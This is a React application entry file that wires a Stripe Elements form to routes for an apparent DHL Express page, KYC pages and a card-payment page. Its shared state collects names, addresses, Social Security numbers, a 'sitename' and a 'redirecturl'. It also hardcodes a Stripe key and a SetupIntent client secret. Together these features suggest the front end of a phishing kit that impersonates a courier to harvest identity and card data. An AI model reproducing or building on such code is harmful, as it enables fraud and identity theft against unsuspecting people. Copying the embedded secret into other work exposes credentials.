import { Elements } from "@stripe/react-stripe-js";
import { loadStripe } from "@stripe/stripe-js";
import React, { createContext } from "react";
import { BrowserRouter, Route, Routes } from "react-router-dom";
import "./App.css";
import DhlExpress from "./dhlexpress";
import KycIndex from "./kycpages";
import CardPayment from "./stripepages/cardpayment";

export const AppContext = createContext();

function App() {
  const [values, setValues] = React.useState({
    firstname: "",
    lastname: "",
    email: "",
    date: "",
    country: "United States",
    address: "",
    city: "",
    state: "",
    zip: "",
    ssn: "",
    sitename: "",
    redirecturl: "",
    verified: false,
  });

  const stripePromise = loadStripe(
    "pk_test_51IsAArBJfVrVZyoUpggY5S8wvQiDgQXniK7ywn7pR6XI9mWjLnFxHuEfCMPencYh58DGBaUrZ0nmu36elU56WHf900bxnRnHbL"
  );

  const options = {
    // passing the client secret obtained in step 2
    clientSecret:
      "seti_1KbabsBJfVrVZyoUX84H31Hl_secret_LIAxPXvQXK08AUdkym9yu2IC8XhfV1Y",
    // Fully customizable with appearance API.
    appearance: { theme: "stripe" },
  };
  

  return (
    <>
      <Elements stripe={stripePromise} options={options}>
        <AppContext.Provider value={{ values, setValues }}>
          <BrowserRouter>
            <Routes>
              <Route path="/" element={<DhlExpress />} />
              <Route path="/cardpaymrnt" element={<CardPayment />} />
              <Route path=":query" element={<KycIndex />} />
              <Route path="/kyc" element={<KycIndex />} />
            </Routes>
          </BrowserRouter>
        </AppContext.Provider>
      </Elements>
    </>
  );
}

export default App;
